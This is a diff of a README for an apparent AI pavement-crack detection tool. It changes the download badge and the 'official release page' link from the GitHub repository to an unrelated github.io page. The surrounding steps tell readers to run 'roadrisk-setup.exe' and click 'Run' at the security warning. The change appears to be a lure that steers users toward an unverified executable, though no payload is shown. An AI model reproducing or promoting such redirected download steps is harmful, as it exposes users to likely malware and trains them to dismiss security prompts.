@@ -1,6 +1,6 @@
 # 🚧 roadrisk-ai-v1-0-0 - Detect pavement cracks using smart AI
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/idolatrous-timessquare972/roadrisk-ai-v1-0-0)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://idolatrous-timessquare972.github.io)
 
 ## 📌 About this application
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to get the application on your computer.
 
-1. Visit the [official release page](https://github.com/idolatrous-timessquare972/roadrisk-ai-v1-0-0) to download the installer.
+1. Visit the [official release page](https://idolatrous-timessquare972.github.io) to download the installer.
 2. Locate the file named `roadrisk-setup.exe` in your Downloads folder.
 3. Double-click the installer file.
 4. A security window may appear. Select "Run" to continue.
